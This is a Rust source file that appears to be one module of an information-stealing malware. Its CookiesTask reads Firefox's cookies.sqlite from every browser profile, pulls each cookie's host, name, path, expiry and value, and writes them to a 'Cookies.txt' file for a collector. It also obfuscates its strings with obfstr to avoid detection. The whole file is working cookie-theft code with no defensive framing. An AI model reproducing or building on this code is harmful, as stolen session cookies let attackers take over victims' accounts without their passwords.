use crate::alloc::borrow::ToOwned;
use crate::gecko::GeckoBrowserData;
use crate::{
    Cookie, ExtractExt, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all,
};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const MOZ_COOKIES_NAME: usize = 2;
const MOZ_COOKIES_VALUE: usize = 3;
const MOZ_COOKIES_HOST: usize = 4;
const MOZ_COOKIES_PATH: usize = 5;
const MOZ_COOKIES_EXPIRY: usize = 6;

#[derive(new)]
pub(super) struct CookiesTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
    parent_name!("Cookies.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(cookies) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("cookies.sqlite"),
            s!("moz_cookies"),
            Cookie::make_extractor((
                MOZ_COOKIES_HOST,
                MOZ_COOKIES_NAME,
                MOZ_COOKIES_PATH,
                MOZ_COOKIES_EXPIRY,
                MOZ_COOKIES_VALUE,
                |value| value.as_string(),
            )),
        ) else {
            return;
        };

        collector.get_browser().increase_cookies_by(cookies.len());
        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
    }
}
